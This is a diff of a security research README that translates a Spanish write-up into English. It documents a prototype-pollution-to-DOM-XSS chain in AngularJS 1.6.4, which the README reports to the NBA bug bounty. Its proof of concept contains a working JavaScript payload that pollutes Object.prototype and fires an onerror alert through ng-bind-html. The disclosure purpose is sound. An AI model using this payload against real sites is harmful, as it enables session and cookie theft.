@@ -1,41 +1,36 @@
-# Prototype-Pollution-Stored-XSS-via-AngularJS-1.6.4
-Este repositorio documenta una vulnerabilidad client-side que combina **Prototype Pollution** y **DOM-Based XSS** en una aplicación que utiliza **AngularJS v1.6.4**. La vulnerabilidad fue identificada y reportada como parte de una investigación educativa.
-
-
 # 🧨 Prototype Pollution → Stored XSS via AngularJS 1.6.4
 
-Este repositorio documenta una vulnerabilidad client-side que combina **Prototype Pollution** y **DOM-Based XSS** en una aplicación que utiliza **AngularJS v1.6.4**. La vulnerabilidad fue identificada y reportada como parte de una investigación educativa.
+This repository documents a **client-side vulnerability** that combines **Prototype Pollution** and **DOM-Based XSS** in a web application using **AngularJS v1.6.4**. The issue was identified and reported as part of an educational security research effort.
 
 ---
 
-## 📚 Descripción
+## 📚 Description
 
-AngularJS 1.6.4 es vulnerable a **Prototype Pollution** a través de la función `angular.merge()`. Cuando un atacante puede modificar `Object.prototype` con propiedades como `innerHTML`, y estas propiedades se usan en combinaciones con `ng-bind-html` y `$sce.trustAsHtml`, se puede escalar a una ejecución arbitraria de código JavaScript en el navegador de la víctima (**XSS**).
+AngularJS 1.6.4 is vulnerable to **Prototype Pollution** through its `angular.merge()` function. When an attacker is able to modify `Object.prototype` with arbitrary properties (e.g., `innerHTML`), and these properties are later rendered via AngularJS features such as `ng-bind-html` and `$sce.trustAsHtml()`, it can lead to arbitrary JavaScript execution (**XSS**) in the victim's browser.
 
 ---
 
-## ⚙️ Tecnología afectada
+## ⚙️ Affected Technology
 
 - Framework: **AngularJS v1.6.4**
-- Función: `angular.merge()`
-- CVE asociado: [CVE-2019-10768](https://nvd.nist.gov/vuln/detail/CVE-2019-10768)
-- Tipo de vulnerabilidad: `Prototype Pollution → DOM-Based XSS`
-- Clasificación CWE:
-  - [CWE-1321: Prototype Pollution](https://cwe.mitre.org/data/definitions/1321.html)
-  - [CWE-79: Cross-Site Scripting](https://cwe.mitre.org/data/definitions/79.html)
+- Vulnerable Function: `angular.merge()`
+- Associated CVE: [CVE-2019-10768](https://nvd.nist.gov/vuln/detail/CVE-2019-10768)
+- Vulnerability Type: `Prototype Pollution → DOM-Based XSS`
+- CWE Classifications:
+  - [CWE-1321: Improperly Controlled Modification of Object Prototype Attributes (Prototype Pollution)](https://cwe.mitre.org/data/definitions/1321.html)
+  - [CWE-79: Cross-Site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
 
 ---
 
-## 🧪 Prueba de Concepto
+## 🧪 Proof of Concept (PoC)
 
-### Paso 1 – Contaminación del Prototipo
+### Step 1 – Prototype Pollution
 
-js
+```js
 angular.merge({}, JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(1337)>","polluted":"yes"}}'));
+console.log({}.polluted); // prints: "yes"
 
-console.log({}.polluted); // imprime "yes"
-
-Paso 2 – Activación del Sink (ng-bind-html)
+Step 2 – Triggering the Sink (ng-bind-html)
 
 angular.element(document.body).injector().invoke(
   ['$compile', '$rootScope', '$sce', function($compile, $rootScope, $sce) {
@@ -47,31 +42,29 @@ angular.element(document.body).injector().invoke(
   }]
 );
 
+✅ This triggers alert(1337), confirming the execution of injected JavaScript.
+🎯 Impact
 
-✅ Se ejecuta alert(1337) confirmando la ejecución de JavaScript inyectado.
+    Type of XSS: DOM-Based XSS
 
- Impacto
+    Current Entry Vector: Developer console (self-XSS)
 
-    Tipo de XSS: DOM-Based XSS
+    Potential Real-World Impact:
 
-    Vector de entrada actual: Consola del navegador (self-XSS)
+        Cookie or token theft
 
-    Impacto potencial:
+        Session hijacking
 
-        Robo de cookies o tokens
+        Internal phishing or persistent client-side injection (if an external input vector is found)
 
-        Secuestro de sesiones
-
-        Phishing interno o inyección persistente si se encuentra un vector externo
-
-📊 CVSS
+📊 CVSS Score
 
 CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
 Base Score: 6.1 (Medium)
 
-🔬 Posibilidades de explotación real
+🔬 Real-World Exploitability
 
-Actualmente el vector requiere acceso a consola (self-XSS). Sin embargo, si el atacante logra inyectar datos en algún punto donde se use angular.merge() (ej. parámetros, cookies, localStorage, APIs), esta vulnerabilidad puede escalar a:
+Currently, exploitation requires access to the browser console (self-XSS). However, if an attacker finds a way to inject data into an object passed to angular.merge() (via URL parameters, cookies, localStorage, or API calls), this vulnerability can escalate to:
 
     ✅ Stored XSS
 
@@ -79,8 +72,10 @@ Actualmente el vector requiere acceso a consola (self-XSS). Sin embargo, si el a
 
     ✅ Persistent client-side compromise
 
-Se está investigando un vector de entrada automatizado.
-📎 Reporte estilo HackerOne
+An automated injection vector is currently under investigation.
+📎 HackerOne-Style Report
 
-Este hallazgo fue reportado al programa de recompensas de bugs de la NBA. La respuesta inicial lo clasificó como self-XSS, pero el exploit sigue siendo técnicamente válido como vulnerabilidad Prototype Pollution y demuestra un impacto potencial serio.
+This vulnerability was responsibly disclosed to the NBA Bug Bounty Program. The initial triage marked it as self-XSS, but the issue remains technically valid as a Prototype Pollution vulnerability with real XSS impact potential.
+⚠️ Disclaimer
 
+This proof of concept is for educational and research purposes only. No unauthorized testing or exploitation was conducted against any live systems.
